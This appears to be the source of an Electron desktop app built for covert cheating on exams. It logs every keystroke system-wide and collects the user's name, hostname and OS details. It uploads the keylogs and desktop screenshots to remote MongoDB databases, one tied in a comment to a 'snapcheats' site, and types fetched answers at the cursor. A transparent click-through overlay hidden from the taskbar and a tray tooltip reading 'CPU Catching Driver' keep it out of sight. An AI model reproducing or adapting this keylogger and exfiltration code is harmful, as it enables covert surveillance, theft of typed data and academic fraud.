const { app, Tray, Menu, globalShortcut, BrowserWindow,screen,ipcMain } = require('electron');
const { uIOhook, UiohookKey } = require('uiohook-napi');
const mongoose = require('mongoose');
const fs = require('fs');
const path = require('path');
const os = require('os'); // To fetch system information
const robot = require('@jitsi/robotjs'); // Use the forked package
const { MongoClient } = require('mongodb');
const screenshot = require('screenshot-desktop'); // Package to take screenshots

let mainWindow;

function createWindow() {
    const { width, height } = screen.getPrimaryDisplay().workAreaSize;

    const windowHeight = height * 0.3; // 30% of screen height
    const windowYPosition = height * 0.6; // Position the window at 60% of the screen height

    // Create the window
     mainWindow = new BrowserWindow({
        width: Math.floor(width * 0.8), // 80% of screen width (20% margin on the right)
        height: Math.floor(windowHeight), // 30% of screen height
        x: Math.floor(width * 0.2), // Start from 20% of the screen width (20% margin on the left)
        y: Math.floor(windowYPosition), // Position at calculated Y position
        alwaysOnTop: true, // Keep on top of other windows
        transparent: true, // Make the window transparent
        frame: false, // Remove window frame
        skipTaskbar: true, // Do not show in taskbar
        focusable: false, // Keep the window non-focusable
        webPreferences: {
            nodeIntegration: true,
            contextIsolation: false,
        }
    });
    mainWindow.loadFile(path.join(__dirname, '/public/index.html'));

    mainWindow.once('ready-to-show', () => {
        mainWindow.show();
        mainWindow.setAlwaysOnTop(true, 'screen-saver', 1); // High priority always on top
        mainWindow.setIgnoreMouseEvents(true, { forward: true });
    });

    // Periodically force the window to stay on top and visible
    setInterval(() => {
        mainWindow.setAlwaysOnTop(true, 'screen-saver', 1);
        mainWindow.show();
    }, 1000); // Every second




    // Global shortcut for Ctrl + A + T to toggle text visibility
    // globalShortcut.register('Alt+X', () => {
    //     mainWindow.webContents.send('make-text-transparent');
    // });

    // Global shortcut for Ctrl + Up to scroll up
    globalShortcut.register('Control+Up', () => { 
        mainWindow.webContents.send('scroll-up');
    });

    // Global shortcut for Ctrl + Down to scroll down
    globalShortcut.register('Control+Down', () => {
        mainWindow.webContents.send('scroll-down');
    });

}


//  collection for storing mode 2 responce
const COLLECTION_NAME = 'keylogresponses';

// First Database Connection (keylogger)
const keyloggerDB = mongoose.createConnection(
    'mongodb+srv:/keylogger',
    { useNewUrlParser: true, useUnifiedTopology: true }
);

keyloggerDB.on('connected', () => console.log('Connected to Keylogger DB'));
keyloggerDB.on('error', (err) => console.error('Keylogger DB connection error:', err));

// Define the schema and model for keylog
const KeyLogSchema = new mongoose.Schema({
    deviceInfo: {
        username: String,
        hostname: String,
        platform: String,
        arch: String,
        osType: String,
        release: String,
    },
    questionNumber: { type: String, required: true },
    loggedKeys: { type: String, default: '' },
    lastTimestamp: { type: Date, default: Date.now },
});

const KeyLog = keyloggerDB.model('KeyLog', KeyLogSchema);

// Device Info
const deviceInfo = {
    username: os.userInfo().username,
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    osType: os.type(),
    release: os.release(),
};

// Second Database Connection (auto-cheat)
const autoCheatDB = mongoose.createConnection(
    '',//  db for which connect with snapcheats website
    { useNewUrlParser: true, useUnifiedTopology: true }
);

autoCheatDB.on('connected', () => console.log('Connected to Auto-Cheat DB'));
autoCheatDB.on('error', (err) => console.error('Auto-Cheat DB connection error:', err));

// Define schema and models for auto-cheat
const imageSchema = new mongoose.Schema({
    question: String,
    image: Buffer,
    contentType: String,
    createdAt: { type: Date, default: Date.now },
});

const responseSchema = new mongoose.Schema({
    questionNumber: String,
    response: String,
    createdAt: { type: Date, default: Date.now },
});

const Image = autoCheatDB.model('Image', imageSchema);
const Response = autoCheatDB.model('Response', responseSchema);


// Variables for keylogging
let isShiftPressed = false;
let isCapsLockOn = false;
const logFilePath = path.join(app.getPath('userData'), 'keylogs.txt');
const tempFilePath = path.join(app.getPath('userData'), 'keylogs_temp.txt');

// Keycode mapping for logging
const keyCodeToChar = {
    [UiohookKey.A]: { normal: 'a', shift: 'A' },
        [UiohookKey.B]: { normal: 'b', shift: 'B' },
        [UiohookKey.C]: { normal: 'c', shift: 'C' },
        [UiohookKey.D]: { normal: 'd', shift: 'D' },
        [UiohookKey.E]: { normal: 'e', shift: 'E' },
        [UiohookKey.F]: { normal: 'f', shift: 'F' },
        [UiohookKey.G]: { normal: 'g', shift: 'G' },
        [UiohookKey.H]: { normal: 'h', shift: 'H' },
        [UiohookKey.I]: { normal: 'i', shift: 'I' },
        [UiohookKey.J]: { normal: 'j', shift: 'J' },
        [UiohookKey.K]: { normal: 'k', shift: 'K' },
        [UiohookKey.L]: { normal: 'l', shift: 'L' },
        [UiohookKey.M]: { normal: 'm', shift: 'M' },
        [UiohookKey.N]: { normal: 'n', shift: 'N' },
        [UiohookKey.O]: { normal: 'o', shift: 'O' },
        [UiohookKey.P]: { normal: 'p', shift: 'P' },
        [UiohookKey.Q]: { normal: 'q', shift: 'Q' },
        [UiohookKey.R]: { normal: 'r', shift: 'R' },
        [UiohookKey.S]: { normal: 's', shift: 'S' },
        [UiohookKey.T]: { normal: 't', shift: 'T' },
        [UiohookKey.U]: { normal: 'u', shift: 'U' },
        [UiohookKey.V]: { normal: 'v', shift: 'V' },
        [UiohookKey.W]: { normal: 'w', shift: 'W' },
        [UiohookKey.X]: { normal: 'x', shift: 'X' },
        [UiohookKey.Y]: { normal: 'y', shift: 'Y' },
        [UiohookKey.Z]: { normal: 'z', shift: 'Z' },
    
        [2]: { normal: '1', shift: '!' },
        [3]: { normal: '2', shift: '@' },
        [4]: { normal: '3', shift: '#' },
        [5]: { normal: '4', shift: '$' },
        [6]: { normal: '5', shift: '%' },
        [7]: { normal: '6', shift: '^' },
        [8]: { normal: '7', shift: '&' },
        [9]: { normal: '8', shift: '*' },
        [10]: { normal: '9', shift: '(' },
        [11]: { normal: '0', shift: ')' },
        [12]: { normal: '-', shift: '_' },
        [13]: { normal: '=', shift: '+' },
    
        [26]: { normal: '[', shift: '{' },
        [27]: { normal: ']', shift: '}' },
        [43]: { normal: '\\', shift: '|' },
    
        [39]: { normal: ';', shift: ':' },
        [40]: { normal: '\'', shift: '"' },
        [51]: { normal: ',', shift: '<' },
        [52]: { normal: '.', shift: '>' },
        [53]: { normal: '/', shift: '?' },
        [57]: { normal: ' ', shift: ' ' },
        [28]: { normal: '\n', shift: '\n' },
    
    // Special keys
    [14]: { normal: '\b', shift: '\b' }, // Backspace
    [57]: { normal: ' ', shift: ' ' },   // Space
    [28]: { normal: '\n', shift: '\n' }, // Enter

    // Numpad keys
    [82]: { normal: '0' },
    [79]: { normal: '1' },
    [80]: { normal: '2' },
    [81]: { normal: '3' },
    [75]: { normal: '4' },
    [76]: { normal: '5' },
    [77]: { normal: '6' },
    [71]: { normal: '7' },
    [72]: { normal: '8' },
    [73]: { normal: '9' },

    // Special symbols (/ * - + .)
    [3637]: { normal: '/' }, // /
    [55]: { normal: '*' },   // *
    [74]: { normal: '-' },   // -
    [78]: { normal: '+' },   // +
    [83]: { normal: '.' },   // .
};

// Create system tray
function createTray() {
    const trayIcon = path.join(__dirname, 'cpu.ico'); // Tray icon image
    const tray = new Tray(trayIcon);

    const contextMenu = Menu.buildFromTemplate([
        {
            label: 'Quit',
            click: () => {
                app.quit();
            }
        }
    ]);

    tray.setToolTip('CPU Catching Driver');
    tray.setContextMenu(contextMenu);
}

// Save the typed key to file
function saveToFile(data) {
    fs.appendFileSync(logFilePath, data, 'utf8');
}



// Handle keydown event for keylogging
uIOhook.on('keydown', (e) => {
    if (e.keycode === 42 || e.keycode === 54) {
        isShiftPressed = true;
        return;
    }
    if (e.keycode === 58) {
        isCapsLockOn = !isCapsLockOn;
        return;
    }

    const keyMapping = keyCodeToChar[e.keycode];
    if (keyMapping) {
        let key = keyMapping.normal;

        if (isShiftPressed) {
            key = keyMapping.shift || keyMapping.normal;
        }
        if (isCapsLockOn && !isShiftPressed && /[a-z]/.test(keyMapping.normal)) {
            key = keyMapping.shift || keyMapping.normal;
        }
        if (isCapsLockOn && isShiftPressed && /[A-Z]/.test(keyMapping.shift)) {
            key = keyMapping.normal; // Correct handling for CapsLock + Shift
        }

        saveToFile(key);
        console.log(key,e.keycode);

    }
});

uIOhook.on('keyup', (e) => {
    if (e.keycode === 42 || e.keycode === 54) {
        isShiftPressed = false;
    }
});

uIOhook.start();

// // Register dynamic global shortcuts based on a number range (e.g., 1-9, 0-9, etc.)



async function fetchAnswerFromMongoDB(questionNumber) {
    const client = new MongoClient('');// db for storing keylogs

    try {
        await client.connect();
        const database = client.db(); // Use the default database in the URI
        const collection = database.collection(COLLECTION_NAME);

        // Update the query field name to match your document structure
        const response = await collection.findOne({ questionNumber });
        if (response) {
            console.log(`Answer for question ${questionNumber}:`, response.response);
            robot.typeString(response.response); // Type the answer where the cursor is
            if (mainWindow && mainWindow.webContents) {
                mainWindow.webContents.send('display-question', response.response);
                console.log('Data sent to index.html'); // Confirm data has been sent
            } else {
                console.error('Main window is not available or webContents is not accessible.');
            }
        } else {
            console.log(`No response for question ${questionNumber} yet.`);
            robot.typeString(`No response for question ${questionNumber} yet.`);
        }
    } catch (err) {
        console.error('Error fetching answer from MongoDB:', err);
    } finally {
        await client.close(); // Ensure the connection is closed
    }
}



  
async function syncFileToMongoDB(questionNumber) {
    console.log("Control went inside syncFileToMongoDB function");

    if (fs.existsSync(logFilePath)) {
        console.log('Log file exists, proceeding with reading the file...');
        
        const data = fs.readFileSync(logFilePath, 'utf8');

        if (data.trim()) {
            try {
                console.log('Renaming log file to temporary file...');
                fs.renameSync(logFilePath, tempFilePath);
                const currentData = fs.readFileSync(tempFilePath, 'utf8');
                console.log('Read data from temp file:', currentData);

                console.log('Device info:', deviceInfo);

                // Create a new log entry with the questionNumber
                const keyLog = new KeyLog({
                    deviceInfo,
                    questionNumber, // Dynamically set question number
                    loggedKeys: currentData,
                    lastTimestamp: new Date(),
                });

                console.log('New log entry created:', keyLog,questionNumber);

                await keyLog.save();
                console.log('New log entry saved to MongoDB   ',questionNumber);

                fs.unlinkSync(tempFilePath);
                console.log('Temporary file deleted after sync');
            } catch (err) {
                console.error('Error syncing data to MongoDB:', err);
                const tempData = fs.readFileSync(tempFilePath, 'utf8');
                fs.appendFileSync(logFilePath, tempData);
                fs.unlinkSync(tempFilePath);
            }
        } else {
            console.log('Log file is empty, no data to sync');
        }
    } else {
        console.log('Log file does not exist');
    }
}



let modeIndex = 0; // Default mode: Send File
const modes = ['send file', 'receive file', 'send image', 'receive image'];

app.whenReady().then(() => {
    createTray(); // Create the tray icon for background process
    createWindow()
    // Unregister all global shortcuts
    globalShortcut.unregisterAll();
    console.log('All global shortcuts unregistered.');

    const numbers = '0123456789';
    const letters = 'abcdefghijklmnopqrstuvwxyz';
    const excludeShortcuts = [
        'Control+a', 'Control+c', 'Control+v', 'Control+z', 'Control+y', 'Control+Shift+Alt+M',
        ...numbers.split('').map(n => `Shift+${n}`)
    ];

    let registeredCount = 0;
    const registeredShortcuts = []; // Array to store all registered shortcuts

    // Function to register shortcuts and pass the code to MongoDB
    const registerShortcut = (prefix, key, code) => {
        const shortcut = `${prefix}+${key}`;

        // Exclude specific shortcuts
        if (excludeShortcuts.includes(shortcut)) {
            return;
        }

        const success = globalShortcut.register(shortcut, () => {
            console.log(`Shortcut triggered: ${shortcut}`);

            if (shortcut === 'Control+Shift+m') {
                // Toggle through the 4 modes
                modeIndex = (modeIndex + 1) % 4; // Properly cycles through 0 → 1 → 2 → 3 → 0
                console.log(`Mode toggled. Current mode is now: ${modes[modeIndex]}`);
                // added later for displying mode in main window
                if (mainWindow && mainWindow.webContents) {
                    mainWindow.webContents.send('display-question',`CM is ${modes[modeIndex]}`);
                    console.log('Data sent to index.html'); // Confirm data has been sent
                } else {
                    console.error('Main window is not available or webContents is not accessible.');
                }
            } 
            else if(shortcut==='Alt+x'){
                console.log('Alt+X shortcut pressed!');

                    mainWindow.webContents.send('make-text-transparent');
            }
            else {
                // Execute corresponding function based on the current mode
                if (modeIndex === 0) {
                    console.log("In 'Send File' mode.");
                    syncFileToMongoDB(`${code}${key}`);  // Send File
                } else if (modeIndex === 1) {
                    console.log("In 'Receive File' mode.");
                    fetchAnswerFromMongoDB(`${code}${key}`);  // Receive File
                } else if (modeIndex === 2) {
                    console.log("In 'Send Image' mode.");
                    sendImageToMongoDB(`${code}${key}`);  // Send Image
                } else if (modeIndex === 3) {
                    console.log("In 'Receive Image' mode.");
                    fetchResponseFromMongoDB(`${code}${key}`);  // Receive Image
                }
            }
        });

        if (success) {
            registeredShortcuts.push(shortcut);
            registeredCount++;
        } else {
            console.log(`Failed to register shortcut: ${shortcut}`);
        }
    };

    // Register shortcuts with various combinations
    const combinations = [
        { prefix: 'Control', code: '1' },
        { prefix: 'Alt', code: '3' },
        { prefix: 'Shift', code: '4' },
        { prefix: 'Control+Alt', code: '5' },
        { prefix: 'Control+Shift', code: '6' },
        { prefix: 'Alt+Shift', code: '7' },
        { prefix: 'Control+Alt+Shift', code: '8' }
    ];

    // Register shortcuts for numbers with different combinations
    for (const combo of combinations) {
        for (const number of numbers) {
            registerShortcut(combo.prefix, number, combo.code);
        }
    }

    // Register shortcuts for letters with different combinations
    for (const combo of combinations) {
        for (const letter of letters) {
            registerShortcut(combo.prefix, letter, combo.code);
        }
    }

    // Register shortcuts with Function keys (F1 to F12, Function = 2)
    for (let i = 1; i <= 12; i++) {
        registerShortcut('', `F${i}`, '2');
    }

    console.log(`Global shortcuts registered: ${registeredCount}`);

    // Save all registered shortcuts to a file
    const filePath = path.join(__dirname, 'registered_shortcuts.txt');
    fs.writeFileSync(filePath, registeredShortcuts.join('\n'));
    console.log(`All registered shortcuts saved to ${filePath}`);
});



// Function to take a screenshot and store in MongoDB
async function sendImageToMongoDB(codeKey) {
    console.log("the key code is   ",codeKey);
    try {
        console.log('Taking screenshot...');
        const screenshotBuffer = await screenshot({ format: 'png' });
        console.log('Screenshot taken successfully.');

        const imageDoc = new Image({
            question: codeKey,
            image: screenshotBuffer,
            contentType: 'image/png'
        });

        await imageDoc.save();
        console.log(`Image saved to MongoDB with codeKey: ${codeKey}`);
    } catch (error) {
        console.error('Error saving image to MongoDB:', error);
    }
}

// Function to fetch response from MongoDB for the given codeKey
async function fetchResponseFromMongoDB(codeKey) {
    try {
        console.log('Fetching response from MongoDB...');

        const response = await Response.findOne({ questionNumber: codeKey });

        if (response) {
            console.log(`Response fetched for questionNumber: ${codeKey}`);
            console.log('Response:', response.response);
            robot.typeString(response.response); // Type the answer where the cursor is
            if (mainWindow && mainWindow.webContents) {
                mainWindow.webContents.send('display-question', response.response);
                console.log('Data sent to index.html'); // Confirm data has been sent
            } else {
                console.error('Main window is not available or webContents is not accessible.');
            }
        } else {
            console.log(`No response found for questionNumber: ${codeKey}`);
        }
    } catch (error) {
        console.error('Error fetching response from MongoDB:', error);
    }
}

app.setLoginItemSettings({
    openAtLogin: false,
    // path: process.execPath, // This is the path of the current app's executable
});



